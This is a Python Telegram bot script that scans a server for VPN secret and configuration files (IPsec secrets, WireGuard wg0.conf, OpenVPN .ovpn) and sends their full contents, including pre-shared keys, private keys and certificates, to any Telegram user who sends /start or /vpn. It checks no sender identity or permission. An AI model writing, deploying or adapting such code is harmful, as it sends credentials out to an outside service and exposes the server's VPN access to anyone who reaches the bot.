import telebot
import os
from glob import glob

TOKEN = os.getenv("TELEGRAM_BOT_TOKEN")
if not TOKEN:
    raise RuntimeError("Нет TELEGRAM_BOT_TOKEN в окружении")

bot = telebot.TeleBot(TOKEN)

# Пути к VPN-конфига на сервере
VPN_PATHS = [
    "/etc/ipsec.secrets",
    "/usr/local/etc/ipsec.secrets",
    "/etc/ipsec.conf",
    "/usr/local/etc/ipsec.conf",
    "/etc/wireguard/wg0.conf",
    "/usr/local/etc/wireguard/wg0.conf",
]

# OpenVPN файлы
VPN_PATHS.extend(glob("/etc/openvpn/*.ovpn"))
VPN_PATHS.extend(glob("/usr/local/etc/openvpn/*.ovpn"))

# Ключевые слова для фильтра содержимого
KEYWORDS = ["psk", "secret", "vpn", "ipsec", "ikev2", "wg", "openvpn", "key", "cert"]

@bot.message_handler(commands=['start', 'vpn'])
def send_vpn(message):
    found = False
    for path in VPN_PATHS:
        if os.path.isfile(path) and os.access(path, os.R_OK):
            with open(path, 'r', errors="ignore") as f:
                content = f.read()

            # Проверка содержимого
            if any(k in content.lower() for k in KEYWORDS):
                text = f"📄 Файл: {path}\n\n{content}"
                # Telegram ограничение ~4096 символов
                for i in range(0, len(text), 4000):
                    bot.send_message(message.chat.id, text[i:i+4000])
                found = True

    if not found:
        bot.reply_to(message, "❌ VPN-конфиги не найдены или нет прав на чтение.")

bot.polling(none_stop=True)